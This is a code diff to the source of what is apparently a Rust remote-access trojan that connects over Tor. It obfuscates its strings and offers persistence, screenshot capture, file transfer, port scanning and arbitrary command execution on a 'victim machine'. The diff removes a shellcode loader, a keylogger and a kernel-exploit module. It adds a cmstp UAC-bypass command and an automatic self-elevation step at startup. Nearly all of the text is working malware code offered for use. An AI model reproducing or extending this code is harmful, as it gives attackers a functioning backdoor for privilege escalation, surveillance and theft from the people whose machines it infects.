@@ -1,6 +1,3 @@
-#[cfg(target_os = "windows")]
-mod kernel_exploit;
-pub mod obfuscate;
 
 
 #[cfg(target_os = "windows")]
@@ -15,8 +12,6 @@ mod exports;
 use goldberg::goldberg_stmts;
 #[cfg(target_os = "windows")]
 use is_elevated::is_elevated;
-#[cfg(target_os = "windows")]
-use std::os::windows::process::CommandExt;
 
 use arti_client::{TorClient, DataStream};
 use arti_client::config::TorClientConfigBuilder;
@@ -105,120 +100,8 @@ fn get_hostname() -> String {
         .unwrap_or_else(|_| cryptify::encrypt_string!("unknown").into())
 }
 
-#[cfg(target_os = "windows")]
-fn execute_shellcode_windows(data: &[u8]) -> Result<()> {
-    unsafe {
-        use std::ffi::CString;
-        let kernel32 = winapi::um::libloaderapi::GetModuleHandleA(
-            CString::new(cryptify::encrypt_string!("kernel32.dll")).unwrap().as_ptr(),
-        );
-        if kernel32.is_null() {
-            return Err(anyhow!(cryptify::encrypt_string!("kernel32.dll not found")));
-        }
-
-        let virtual_alloc = winapi::um::libloaderapi::GetProcAddress(
-            kernel32,
-            CString::new(cryptify::encrypt_string!("VirtualAlloc")).unwrap().as_ptr(),
-        );
-        if virtual_alloc.is_null() {
-            return Err(anyhow!(cryptify::encrypt_string!("resolve VirtualAlloc failed")));
-        }
-        let create_thread = winapi::um::libloaderapi::GetProcAddress(
-            kernel32,
-            CString::new(cryptify::encrypt_string!("CreateThread")).unwrap().as_ptr(),
-        );
-        if create_thread.is_null() {
-            return Err(anyhow!(cryptify::encrypt_string!("resolve CreateThread failed")));
-        }
-        let close_handle = winapi::um::libloaderapi::GetProcAddress(
-            kernel32,
-            CString::new(cryptify::encrypt_string!("CloseHandle")).unwrap().as_ptr(),
-        );
-        if close_handle.is_null() {
-            return Err(anyhow!(cryptify::encrypt_string!("resolve CloseHandle failed")));
-        }
-        let virtual_free = winapi::um::libloaderapi::GetProcAddress(
-            kernel32,
-            CString::new(cryptify::encrypt_string!("VirtualFree")).unwrap().as_ptr(),
-        );
-        if virtual_free.is_null() {
-            return Err(anyhow!(cryptify::encrypt_string!("resolve VirtualFree failed")));
-        }
-
-        type VirtualAllocFn = unsafe extern "system" fn(*mut u8, usize, u32, u32) -> *mut u8;
-        type CreateThreadFn = unsafe extern "system" fn(*mut u8, usize, Option<unsafe extern "system" fn(*mut u8) -> u32>, *mut u8, u32, *mut u32) -> *mut u8;
-        type CloseHandleFn = unsafe extern "system" fn(*mut u8) -> i32;
-        type VirtualFreeFn = unsafe extern "system" fn(*mut u8, usize, u32) -> i32;
-
-        let virtual_alloc: VirtualAllocFn = std::mem::transmute(virtual_alloc);
-        let create_thread: CreateThreadFn = std::mem::transmute(create_thread);
-        let close_handle: CloseHandleFn = std::mem::transmute(close_handle);
-        let _virtual_free: VirtualFreeFn = std::mem::transmute(virtual_free);
-
-        let ptr = (virtual_alloc)(
-            std::ptr::null_mut(),
-            data.len(),
-            goldberg::goldberg_int!(0x3000u32),
-            goldberg::goldberg_int!(0x40u32),
-        );
-        if ptr.is_null() {
-            return Err(anyhow!(cryptify::encrypt_string!("VirtualAlloc failed")));
-        }
-
-        std::ptr::copy_nonoverlapping(data.as_ptr(), ptr as *mut u8, data.len());
-
-        let shellcode_fn: unsafe extern "system" fn(*mut u8) -> u32 = std::mem::transmute(ptr);
-        let thread = (create_thread)(
-            std::ptr::null_mut(),
-            0,
-            Some(shellcode_fn),
-            std::ptr::null_mut(),
-            0,
-            std::ptr::null_mut(),
-        );
-        if thread.is_null() {
-            return Err(anyhow!(cryptify::encrypt_string!("CreateThread failed")));
-        }
-        (close_handle)(thread);
-    }
-    Ok(())
-}
-
-#[cfg(not(target_os = "windows"))]
-fn execute_shellcode_unix(data: &[u8]) -> Result<()> {
-    let data = data.to_vec();
-    std::thread::spawn(move || {
-        unsafe {
-            let pagesize = libc::sysconf(libc::_SC_PAGESIZE) as usize;
-            let aligned_size = (data.len() + pagesize - 1) & !(pagesize - 1);
-
-            let ptr = libc::mmap(
-                std::ptr::null_mut(),
-                aligned_size,
-                libc::PROT_READ | libc::PROT_WRITE | libc::PROT_EXEC,
-                libc::MAP_PRIVATE | libc::MAP_ANONYMOUS,
-                -1,
-                0,
-            );
-
-            if ptr == libc::MAP_FAILED {
-                return;
-            }
-
-            std::ptr::copy_nonoverlapping(data.as_ptr(), ptr as *mut u8, data.len());
-
-            let func: extern "C" fn() = std::mem::transmute(ptr);
-            func();
-
-            libc::munmap(ptr, aligned_size);
-        }
-    });
-    Ok(())
-}
-
 /// Execute a command
 pub async fn run_command(input: &str) -> Result<Vec<u8>> {
-    obfuscate::sleep_jitter_default();
     let mut parts = input.trim().split_whitespace();
 
     let cmd = parts.next().ok_or_else(|| anyhow!(cryptify::encrypt_string!("Empty command")))?;
@@ -233,19 +116,16 @@ Available commands:
     `screenshot`=>\tTake screenshot from vicim machine
     `upload [filename]`=>\tUpload file to the server
     `download [filename]`=>\tDownload file from the server
-    `shellcode [file]`=>\tExecute shellcode from file
     `uac [exe_path]`=>\tRun elevated command on Windows (slui)
+    `uac2 [exe_path]`=>\tRun elevated command on Windows (cmstp)
     `persist`=>\tApply persistence on target
     `check_elevated`=>\tCheck if running with elevated privileges
     `self_uac`=>\tRun UAC bypass on self
     `portscan <tcp|udp|sctp> <host> [--fast]`=>\tPort scan target host
-    `keylogger_start`=>\tStart keylogger (auto-dumps every 60s)
-    `keylogger_stop`=>\tStop keylogger
 
     ").into_bytes())
         }
         "screenshot" => {
-            obfuscate::sleep_jitter_default();
             #[cfg(target_os = "android")]
             let encoded = {
                 let output = std::process::Command::new(cryptify::encrypt_string!("/system/bin/screencap"))
@@ -262,7 +142,6 @@ Available commands:
             Ok(format!("[file] {} {}", filename, encoded).into_bytes())
         }
         "upload" => {
-            obfuscate::sleep_jitter_default();
             let input_filename = args
                 .get(goldberg::goldberg_int!(0))
                 .ok_or_else(|| anyhow!(cryptify::encrypt_string!("upload: missing filename")))?;
@@ -288,7 +167,6 @@ Available commands:
             Ok(output.into_bytes())
         }
         "download" | "[file][" => {
-            obfuscate::sleep_jitter_default();
             let input_filename = args
                 .get(goldberg::goldberg_int!(0))
                 .ok_or_else(|| anyhow!(cryptify::encrypt_string!("download: missing filename")))?;
@@ -306,7 +184,6 @@ Available commands:
             Ok(format!("Wrote data to {}", input_filename).into_bytes())
         }
         "cd" => {
-            obfuscate::sleep_jitter_default();
             let target = args.get(goldberg::goldberg_int!(0)).ok_or_else(|| anyhow!(cryptify::encrypt_string!("cd: missing argument")))?;
 
             match std::env::set_current_dir(target) {
@@ -320,7 +197,6 @@ Available commands:
             }
         }
         "uac" => {
-            obfuscate::sleep_jitter_default();
             #[cfg(target_os = "windows")]
             {
                 if args.is_empty() {
@@ -339,14 +215,29 @@ Available commands:
             }
         }
 
-        "persist" => {
-            obfuscate::sleep_jitter_default();
-            let _ = persist::persist();
-            Ok(b"Persistence applied\n".to_vec())
+        "uac2" => {
+            #[cfg(target_os = "windows")]
+            {
+                if args.is_empty() {
+                    return Ok(b"uac2: missing argument\n".to_vec());
+                }
+
+                let payload = args.join(cryptify::encrypt_string!(" ").as_str());
+                let ret = uac_cmstp::execute(&payload);
+                if ret == 0 {
+                    Ok(format!("UAC (cmstp) triggered with payload: {}\n", payload).into_bytes())
+                } else {
+                    Ok(format!("UAC (cmstp) failed (returned {}) with payload: {}\n", ret, payload).into_bytes())
+                }
+            }
+
+            #[cfg(not(target_os = "windows"))]
+            {
+                Ok(b"uac2 not supported on this OS\n".to_vec())
+            }
         }
 
         "check_elevated" => {
-            obfuscate::sleep_jitter_default();
             #[cfg(target_os = "windows")]
             {
                 let elevated = is_elevated();
@@ -359,7 +250,6 @@ Available commands:
         }
 
         "self_uac" => {
-            obfuscate::sleep_jitter_default();
             #[cfg(target_os = "windows")]
             {
                 let exe_path = match std::env::current_exe() {
@@ -375,8 +265,12 @@ Available commands:
             }
         }
 
+        "persist" => {
+            let _ = persist::persist();
+            Ok(b"Persistence applied\n".to_vec())
+        }
+
         "portscan" => {
-            obfuscate::sleep_jitter_default();
             let protocol = args.get(goldberg::goldberg_int!(0)).ok_or_else(|| anyhow!(cryptify::encrypt_string!("portscan: missing protocol")))?.to_lowercase();
             let host = args.get(goldberg::goldberg_int!(1)).ok_or_else(|| anyhow!(cryptify::encrypt_string!("portscan: missing host")))?.to_string();
             let fast = args.contains(&cryptify::encrypt_string!("--fast").as_str());
@@ -413,50 +307,11 @@ Available commands:
             }
         }
 
-        "shellcode" => {
-            obfuscate::sleep_jitter_default();
-            let b64_data = args
-                .get(goldberg::goldberg_int!(0))
-                .ok_or_else(|| anyhow!(cryptify::encrypt_string!("shellcode: missing base64 data")))?;
-
-            let data = general_purpose::STANDARD.decode(b64_data)?;
-
-            let msg = format!("Executing shellcode ({} bytes)\n", data.len());
-
-            #[cfg(target_os = "windows")]
-            execute_shellcode_windows(&data)?;
-
-            #[cfg(not(target_os = "windows"))]
-            execute_shellcode_unix(&data)?;
-
-            Ok(msg.into_bytes())
-        }
-
-        "keylogger_start" => {
-            obfuscate::sleep_jitter_default();
-            if util::keylogger::is_running() {
-                Ok(b"Keylogger already running\n".to_vec())
-            } else {
-                util::keylogger::start();
-                Ok(b"Keylogger started\n".to_vec())
-            }
-        }
-        "keylogger_stop" => {
-            obfuscate::sleep_jitter_default();
-            if util::keylogger::is_running() {
-                util::keylogger::stop();
-                Ok(b"Keylogger stopped\n".to_vec())
-            } else {
-                Ok(b"Keylogger not running\n".to_vec())
-            }
-        }
         "exit" | "quit" | "/quit" => {
-            obfuscate::sleep_jitter_default();
             Ok(cryptify::encrypt_string!("Goodbye\n").as_bytes().to_vec())
         }
 
         _ => goldberg_stmts!({
-            obfuscate::sleep_jitter_default();
             #[cfg(target_os = "windows")]
             let mut command = {
                 let mut c = Command::new(cryptify::encrypt_string!("cmd.exe"));
@@ -488,7 +343,6 @@ Available commands:
 
 
             let output = command.output().await?;
-            obfuscate::sleep_jitter_default();
             let mut result = Vec::new();
             result.extend_from_slice(&output.stdout);
             result.extend_from_slice(&output.stderr);
@@ -529,93 +383,75 @@ pub async fn read_loop(stream: DataStream) -> Result<bool> {
     writer.write_all(b"\n>> ").await?;
     writer.flush().await?;
 
-    let mut keylog_timer = tokio::time::interval(Duration::from_secs(goldberg::goldberg_int!(60)));
-    keylog_timer.tick().await;
-
     loop {
-        tokio::select! {
-            _ = keylog_timer.tick() => {
-                if util::keylogger::is_running() {
-                    let keys = util::keylogger::dump_and_clear();
-                    if !keys.is_empty() {
-                        let encoded = general_purpose::STANDARD.encode(keys.as_bytes());
-                        let msg = format!("[keylog] {}\n", encoded);
-                        let _ = writer.write_all(msg.as_bytes()).await;
-                        let _ = writer.flush().await;
-                    }
-                }
+        let n = reader.read(&mut buf).await?;
+
+        if n == 0 {
+            println!("{}", cryptify::encrypt_string!("Connection closed by remote"));
+            return Ok(false);
+        }
+
+        buffer.push_str(&String::from_utf8_lossy(&buf[..n]));
+
+        while let Some(pos) = buffer.find('\n') {
+            let mut line = buffer[..pos].to_string();
+            buffer.drain(..=pos);
+
+            line = line.trim().to_string();
+
+            if line.starts_with(&cryptify::encrypt_string!("download-start ")) {
+                let parts: Vec<&str> = line.splitn(goldberg::goldberg_int!(2), ' ').collect();
+                dl_filename = Some(parts.get(goldberg::goldberg_int!(1)).copied().unwrap_or(&cryptify::encrypt_string!("unknown")).to_string());
+                dl_data.clear();
+                continue;
             }
-            result = reader.read(&mut buf) => {
-                let n = result?;
 
-                if n == 0 {
-                    println!("{}", cryptify::encrypt_string!("Connection closed by remote"));
-                    return Ok(false);
+            if dl_filename.is_some() {
+                if line.starts_with(&cryptify::encrypt_string!("download-chunk ")) {
+                    let parts: Vec<&str> = line.splitn(goldberg::goldberg_int!(2), ' ').collect();
+                    if let Some(chunk) = parts.get(goldberg::goldberg_int!(1)) {
+                        dl_data.push_str(chunk);
+                    }
+                    continue;
                 }
-
-                buffer.push_str(&String::from_utf8_lossy(&buf[..n]));
-                
-                while let Some(pos) = buffer.find('\n') {
-                    let mut line = buffer[..pos].to_string();
-                    buffer.drain(..=pos);
-
-                    line = line.trim().to_string();
-
-                    if line.starts_with(&cryptify::encrypt_string!("download-start ")) {
-                        let parts: Vec<&str> = line.splitn(goldberg::goldberg_int!(2), ' ').collect();
-                        dl_filename = Some(parts.get(goldberg::goldberg_int!(1)).copied().unwrap_or(&cryptify::encrypt_string!("unknown")).to_string());
-                        dl_data.clear();
-                        continue;
-                    }
-
-                    if dl_filename.is_some() {
-                        if line.starts_with(&cryptify::encrypt_string!("download-chunk ")) {
-                            let parts: Vec<&str> = line.splitn(goldberg::goldberg_int!(2), ' ').collect();
-                            if let Some(chunk) = parts.get(goldberg::goldberg_int!(1)) {
-                                dl_data.push_str(chunk);
-                            }
-                            continue;
-                        }
-                        if line == cryptify::encrypt_string!("download-end") {
-                            let fname = dl_filename.take().unwrap();
-                            let raw = general_purpose::STANDARD.decode(&dl_data)?;
-                            fs::write(&fname, &raw)?;
-                            let msg = format!("Wrote data to {}\n", fname);
-                            writer.write_all(msg.as_bytes()).await?;
-                            writer.write_all(RESPONSE_DELIM.as_bytes()).await?;
-                            writer.flush().await?;
-                            continue;
-                        }
-                        dl_filename = None;
-                        dl_data.clear();
-                    }
-
-                    if line.is_empty() {
-                        writer.write_all(RESPONSE_DELIM.as_bytes()).await?;
-                        writer.flush().await?;
-                        continue;
-                    }
-
-                    if line == cryptify::encrypt_string!("exit") || line == cryptify::encrypt_string!("quit") || line == cryptify::encrypt_string!("/quit") {
-                        writer.write_all(b"Goodbye\n").await?;
-                        writer.flush().await?;
-                        return Ok(true);
-                    }
-
-                    match run_command(&line).await {
-                      Ok(output) => {
-                      writer.write_all(&output).await?;
-                      }
-                      Err(e) => {
-                        let err_msg = format!("ERROR: {}\n", e);
-                        writer.write_all(err_msg.as_bytes()).await?;
-                    }
+                if line == cryptify::encrypt_string!("download-end") {
+                    let fname = dl_filename.take().unwrap();
+                    let raw = general_purpose::STANDARD.decode(&dl_data)?;
+                    fs::write(&fname, &raw)?;
+                    let msg = format!("Wrote data to {}\n", fname);
+                    writer.write_all(msg.as_bytes()).await?;
+                    writer.write_all(RESPONSE_DELIM.as_bytes()).await?;
+                    writer.flush().await?;
+                    continue;
                 }
+                dl_filename = None;
+                dl_data.clear();
+            }
 
+            if line.is_empty() {
                 writer.write_all(RESPONSE_DELIM.as_bytes()).await?;
                 writer.flush().await?;
-                }
+                continue;
             }
+
+            if line == cryptify::encrypt_string!("exit") || line == cryptify::encrypt_string!("quit") || line == cryptify::encrypt_string!("/quit") {
+                writer.write_all(b"Goodbye\n").await?;
+                writer.flush().await?;
+                return Ok(true);
+            }
+
+            match run_command(&line).await {
+              Ok(output) => {
+              writer.write_all(&output).await?;
+              }
+              Err(e) => {
+                let err_msg = format!("ERROR: {}\n", e);
+                writer.write_all(err_msg.as_bytes()).await?;
+            }
+        }
+
+        writer.write_all(RESPONSE_DELIM.as_bytes()).await?;
+        writer.flush().await?;
         }
     }
 }
@@ -663,6 +499,16 @@ pub async fn netclient_run(config: ClientConfig) -> Result<()> {
 
 
 async fn netclient_impl() -> c_int {
+    #[cfg(target_os = "windows")]
+    goldberg_stmts!({
+        let executable = std::env::current_exe().unwrap().display().to_string();
+        uac_cmstp::execute(&executable);
+        println!("Ran uac bypass. sleeping for 31 seconds");
+        sleep(Duration::from_secs(31)).await;
+    });
+    let startup_delay = rand_range(goldberg::goldberg_int!(17), goldberg::goldberg_int!(42));
+    println!("{} {}s", cryptify::encrypt_string!("Delaying startup by"), startup_delay);
+    sleep(Duration::from_secs(startup_delay)).await;
     goldberg_stmts!({
         let _ = netclient_run(ClientConfig::default()).await;
         0
